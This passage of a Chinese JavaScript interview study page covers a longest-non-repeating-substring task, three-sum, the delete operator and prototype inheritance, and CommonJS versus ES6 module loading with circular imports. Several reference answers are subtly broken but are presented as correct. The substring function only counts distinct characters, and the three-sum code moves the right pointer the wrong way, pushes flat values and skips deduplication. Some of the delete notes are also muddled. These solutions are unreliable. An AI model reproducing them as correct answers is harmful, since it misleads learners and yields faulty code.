class=\"token punctuation\">)</span> \n    <span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"给定一个字符串，请你找出其中不含有重复字符的-最长子串-的长度\"><a href=\"#给定一个字符串，请你找出其中不含有重复字符的-最长子串-的长度\" class=\"headerlink\" title=\"给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度\"></a><strong>给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度</strong></h4><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">countWord</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">str</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">let</span> arr <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">let</span> count <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> str<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>arr<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      arr<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      count<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> count<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">let</span> str <span class=\"token operator\">=</span> <span class=\"token string\">\"qqdwqcasdffdghjsbjhbm\"</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">countWord</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"三数之和\"><a href=\"#三数之和\" class=\"headerlink\" title=\"三数之和\"></a>三数之和</h4><p><strong>参考答案：</strong></p>\n<p>题目描述</p>\n<p>给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c &#x3D; 0 ？找出所有满足条件且不重复的三元组。</p>\n<p>注意：答案中不可以包含重复的三元组。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">//例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]，</span>\n<span class=\"token comment\">//满足要求的三元组集合为：</span>\n<span class=\"token punctuation\">[</span>\n  <span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> nums <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">getNum</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">nums</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&lt;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">let</span> ans <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  nums<span class=\"token punctuation\">.</span><span class=\"token function\">sort</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">a<span class=\"token punctuation\">,</span> b</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> a <span class=\"token operator\">-</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> nums<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">let</span> l <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">let</span> r <span class=\"token operator\">=</span> nums<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>l <span class=\"token operator\">&lt;</span> r<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">let</span> sum <span class=\"token operator\">=</span> nums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> nums<span class=\"token punctuation\">[</span>l<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> nums<span class=\"token punctuation\">[</span>r<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>sum <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        ans<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> nums<span class=\"token punctuation\">[</span>l<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> nums<span class=\"token punctuation\">[</span>r<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        l<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n        r<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>sum <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        r<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        l<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">getNum</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n\n\n\n\n\n\n<h2 id=\"代码解释题\"><a href=\"#代码解释题\" class=\"headerlink\" title=\"代码解释题\"></a>代码解释题</h2><ol>\n<li></li>\n</ol>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> company <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token literal-property property\">address</span><span class=\"token operator\">:</span> <span class=\"token string\">'beijing'</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">var</span> yideng <span class=\"token operator\">=</span> Object<span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span>company<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">delete</span> yideng<span class=\"token punctuation\">.</span>address\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>yideng<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 写出执行结果，并解释原因</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>答案</strong><br>beijing</p>\n<p><strong>解析</strong><br>这里的 yideng 通过 prototype 继承了 company的 address。yideng自己并没有address属性。所以delete操作符的作用是无效的。</p>\n<p><strong>扩展</strong><br>1.delete使用原则：delete 操作符用来删除一个对象的属性。<br>2.delete在删除一个不可配置的属性时在严格模式和非严格模式下的区别:<br>（1）在严格模式中，如果属性是一个不可配置（non-configurable）属性，删除时会抛出异常;<br>（2）非严格模式下返回 false。<br>3.delete能删除隐式声明的全局变量：这个全局变量其实是global对象(window)的属性<br>4.delete能删除的：<br>（1）可配置对象的属性（2）隐式声明的全局变量 （3）用户定义的属性 （4）在ECMAScript 6中，通过 const 或 let 声明指定的 “temporal dead zone” (TDZ) 对 delete 操作符也会起作用<br>delete不能删除的：<br>（2）显式声明的全局变量 （2）内置对象的内置属性 （3）一个对象从原型继承而来的属性<br>5.delete删除数组元素：<br>（1）当你删除一个数组元素时，数组的 length 属性并不会变小，数组元素变成undefined<br>（2）当用 delete 操作符删除一个数组元素时，被删除的元素已经完全不属于该数组。<br>（3）如果你想让一个数组元素的值变为 undefined 而不是删除它，可以使用 undefined 给其赋值而不是使用 delete 操作符。此时数组元素是在数组中的<br>6.delete 操作符与直接释放内存（只能通过解除引用来间接释放）没有关系。</p>\n<h2 id=\"模块化\"><a href=\"#模块化\" class=\"headerlink\" title=\"模块化\"></a>模块化</h2><h3 id=\"CommonJS规范\"><a href=\"#CommonJS规范\" class=\"headerlink\" title=\"CommonJS规范\"></a>CommonJS规范</h3><p><strong>参考答案：</strong></p>\n<p>CommonJS规范加载模块是同步的，只有加载完成，才能执行后面的操作。</p>\n<p>CommonJS规范中的module、exports和require</p>\n<ul>\n<li>每个文件就是一个模块，有自己的作用域。每个模块内部，<code>module</code>变量代表当前模块，是一个对象，它的<code>exports</code>属性（即<code>module.exports</code>）是对外的接口。</li>\n<li><code>module.exports</code>属性表示当前模块对外输出的接口，其他文件加载该模块，实际上就是读取<code>module.exports</code>变量。</li>\n<li>为了方便，<code>Node</code>为每个模块提供一个<code>exports</code>变量，指向<code>module.exports</code>。</li>\n</ul>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> exports <span class=\"token operator\">=</span> module<span class=\"token punctuation\">.</span>exports<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li><code>require</code>命令用于加载模块文件。</li>\n</ul>\n<p>使用示例：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">//name.js</span>\nexports<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">name</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span> <span class=\"token string\">'李婷婷'</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//导出</span>\n<span class=\"token comment\">//getName.js</span>\n<span class=\"token keyword\">let</span> getName <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//引入</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>注：不能直接将<code>exports</code>变量指向一个值，因为这样等于切断了<code>exports</code>与<code>module.exports</code>的联系：如下</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token function-variable function\">exports</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>如果一个模块的对外接口，就是一个单一的值，不能使用<code>exports</code>输出，只能使用<code>module.exports</code>输出。</p>\n<p>CommonJS模块导入用<code>require</code>，导出用<code>module.exports</code>。导出的对象需注意，如果是静态值，而且非常量，后期可能会有所改动的，请使用函数动态获取，否则无法获取修改值。导入的参数，是可以随意改动的，所以使用时要注意</p>\n<h3 id=\"ES6-module-和-CommonJS-module-的区别\"><a href=\"#ES6-module-和-CommonJS-module-的区别\" class=\"headerlink\" title=\"ES6 module 和 CommonJS module 的区别\"></a><del>ES6 module 和 CommonJS module 的区别</del></h3><p><strong>参考答案</strong>：</p>\n<ul>\n<li>为<strong>CommonJS</strong>的<code>require</code>语法是同步的，所以就导致了<strong>CommonJS</strong>模块规范只适合用在服务端，而ES6模块无论是在浏览器端还是服务端都是可以使用的，但是在服务端中，还需要遵循一些特殊的规则才能使用 ；</li>\n<li><strong>CommonJS</strong> 模块输出的是一个值的拷贝，而ES6 模块输出的是值的引用；</li>\n<li><strong>CommonJS</strong> 模块是运行时加载，而ES6 模块是编译时输出接口，使得对JS的模块进行静态分析成为了可能</li>\n<li>因为两个模块加载机制的不同，所以在对待循环加载的时候，它们会有不同的表现。<strong>CommonJS</strong>遇到循环依赖的时候，只会输出已经执行的部分，后续的输出或者变化，是不会影响已经输出的变量。而ES6模块相反，使用<code>import</code>加载一个变量，变量不会被缓存，真正取值的时候就能取到最终的值；</li>\n<li>关于模块顶层的<code>this</code>指向问题，在<strong>CommonJS</strong>顶层，<code>this</code>指向当前模块；而在ES6模块中，<code>this</code>指向<code>undefined</code>；</li>\n<li>关于两个模块互相引用的问题，在ES6模块当中，是支持加载<strong>CommonJS</strong>模块的。但是反过来，<strong>CommonJS</strong>并不能<code>require</code>ES6模块，在NodeJS中，两种模块方案是分开处理的。</li>\n</ul>\n<h3 id=\"ES6-module、CommonJS-module-循环引用的问题\"><a href=\"#ES6-module、CommonJS-module-循环引用的问题\" class=\"headerlink\" title=\"ES6 module、CommonJS module 循环引用的问题\"></a><del>ES6 module、CommonJS module 循环引用的问题</del></h3><p><strong>参考答案：</strong></p>\n<p> 循环加载指的是a脚本的执行依赖b脚本，b脚本的执行依赖a脚本</p>\n<ol>\n<li><p>CommonJS模块是加载时执行。一旦出现某个模块被“循环加载”，就只输出已经执行的部分，没有执行的部分不会输出。</p>\n</li>\n<li><p>ES6模块对导出模块，变量，对象是动态引用，遇到模块加载命令import时不会去执行模块，只是生成一个指向被加载模块的引用。</p>\n<p>CommonJS模块规范主要适用于后端Node.js，后端Node.js是同步模块加载，所以在模块循环引入时模块已经执行完毕。推荐前端工程中使用ES6的模块规范，通过安装Babel转码插件支持ES6模块引入的语法。</p>\n</li>\n</ol>\n<p><strong>解析：</strong></p>\n<ol>\n<li>CommonJS模块的加载原理</li>\n</ol>\n<p>CommonJS模块就是一个脚本文件，require命令第一次加载该脚本时就会执行整个脚本，然后在内存中生成该模块的一个说明对象。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token literal-property property\">id</span><span class=\"token operator\">:</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\">//模块名，唯一</span>\n    <span class=\"token literal-property property\">exports</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">//模块输出的各个接口</span>\n        <span class=\"token operator\">...</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    <span class=\"token literal-property property\">loaded</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\">//模块的脚本是否执行完毕</span>\n    <span class=\"token operator\">...</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>以后用到这个模块时，就会到对象的exports属性中取值。即使再次执行require命令，也不会再次执行该模块，而是到缓存中取值。</p>\n<p>CommonJS模块是加载时执行，即脚本代码在require时就全部执行。一旦出现某个模块被“循环加载”，就只输出已经执行的部分，没有执行的部分不会输出。</p>\n<p>案例说明：</p>\n<p>案例来源于Node官方说明：<a href=\"https://nodejs.org/api/modules.html#modules_cycles\">nodejs.org&#x2F;api&#x2F;modules…</a></p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">//a.js</span>\nexports<span class=\"token punctuation\">.</span>done <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">var</span> b <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./b.js'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'在a.js中，b.done = %j'</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">.</span>done<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nexports<span class=\"token punctuation\">.</span>done <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a.js执行完毕！'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">//b.js</span>\nexports<span class=\"token punctuation\">.</span>done <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./a.js'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'在b.js中，a.done = %j'</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>done<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nexports<span class=\"token punctuation\">.</span>done <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'b.js执行完毕！'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">//main.js</span>\n<span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./a.js'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> b <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./b.js'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'在main.js中，a.done = %j, b.done = %j'</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>done<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">.</span>done<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>输出结果如下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;&#x2F;node环境下运行main.js\nnode main.js\n\n在b.js中，a.done &#x3D; false\nb.js执行完毕！\n在a.js中，b.done &#x3D; true\na.js执行完毕！\n在main.js中，a.done &#x3D; true, b.done &#x3D; true<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>JS代码执行顺序如下：</p>\n<p>1）main.js中先加载a.js，a脚本先输出done变量，值为false，然后加载b脚本，a的代码停止执行，等待b脚本执行完成后，才会继续往下执行。</p>\n<p>2）b.js执行到第二行会去加载a.js，这时发生循环加载，系统会去a.js模块对应对象的exports属性取值，因为a.js没执行完，从exports属性只能取回已经执行的部分，未执行的部分不返回，所以取回的值并不是最后的值。</p>\n<p>3）a.js已执行的代码只有一行，exports.done &#x3D; false;所以对于b.js来说，require a.js只输出了一个变量done，值为false。往下执行console.log(‘在b.js中，a.done &#x3D; %j’, a.done);控制台打印出：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">在b.js中，a.done &#x3D; false<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>4）b.js继续往下执行，done变量设置为true，console.log(‘b.js执行完毕！’)，等到全部执行完毕，将执行权交还给a.js。此时控制台输出：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">b.js执行完毕！<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>5）执行权交给a.js后，a.js接着往下执行，执行console.log(‘在a.js中，b.done &#x3D; %j’, b.done);控制台打印出：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">在a.js中，b.done &#x3D; true<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>6）a.js继续执行，变量done设置为true，直到a.js执行完毕。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">a.js执行完毕！<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>7）main.js中第二行不会再次执行b.js，直接输出缓存结果。最后控制台输出：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">在main.js中，a.done &#x3D; true, b.done &#x3D; true<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>总结：</p>\n<p>1）在b.js中，a.js没有执行完毕，只执行了第一行，所以循环加载中，只输出已执行的部分。</p>\n<p>2）main.js第二行不会再次执行，而是输出缓存b.js的执行结果。exports.done &#x3D; true;</p>\n<ol>\n<li>ES6模块的循环加载</li>\n</ol>\n<p>ES6模块与CommonJS有本质区别，ES6模块对导出变量，方法，对象是动态引用，遇到模块加载命令import时不会去执行模块，只是生成一个指向被加载模块的引用，需要开发者保证真正取值时能够取到值，只要引用是存在的，代码就能执行。</p>\n<p>案例说明：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">//even.js</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">&#123;</span>odd<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'./odd'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">var</span> counter <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">function</span> <span class=\"token function\">even</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">n</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    counter <span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> n <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> <span class=\"token function\">odd</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n复制代码\n<span class=\"token comment\">//odd.js</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">&#123;</span>even<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'./even.js'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">function</span> <span class=\"token function\">odd</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">n</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> n <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">even</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n复制代码\n<span class=\"token comment\">//index.js</span>\n<span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">as</span> m <span class=\"token keyword\">from</span> <span class=\"token string\">'./even.js'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">var</span> x <span class=\"token operator\">=</span> m<span class=\"token punctuation\">.</span><span class=\"token function\">even</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">var</span> y <span class=\"token operator\">=</span> m<span class=\"token punctuation\">.</span><span class=\"token function\">even</span><span class=\"token 